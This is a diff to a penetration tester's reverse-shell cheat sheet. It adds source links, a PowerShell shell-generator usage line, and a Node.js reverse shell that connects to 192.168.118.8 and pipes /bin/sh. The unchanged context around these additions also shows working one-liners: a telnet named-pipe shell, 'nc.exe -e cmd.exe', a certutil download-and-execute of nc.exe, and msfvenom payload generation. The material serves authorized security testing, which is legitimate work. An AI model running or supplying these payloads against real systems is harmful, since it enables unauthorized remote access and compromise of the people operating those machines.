@@ -1,5 +1,7 @@
 ## Reference - Refererd from vaiours online sources PayloadAllTheThings
-
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
 
 ## INITIAL ENTRY 
 ````
@@ -66,6 +68,9 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 ## WINDOWS
 #### COMON
 ````
+python /opt/windows/mkpsrevshell.py                            
+USAGE: mkpsrevshell.py IP PORT
+
 \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.1.1 4444
 
 certutil -urlcache -f http://192.168.1.1/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.1.1 4444
@@ -124,4 +129,26 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.e
 
 Unstaged size restricted 
 msfvenom -p windows/exec CMD=calc.exe -b "x00" -f py
+````
+## Javascript
+````
+mongodb_shell
+
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(21, "192.168.118.8", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+````
+Can also do
+````
+python jsgen.py reverse --ip 10.10.10.10 --port 69
 ````
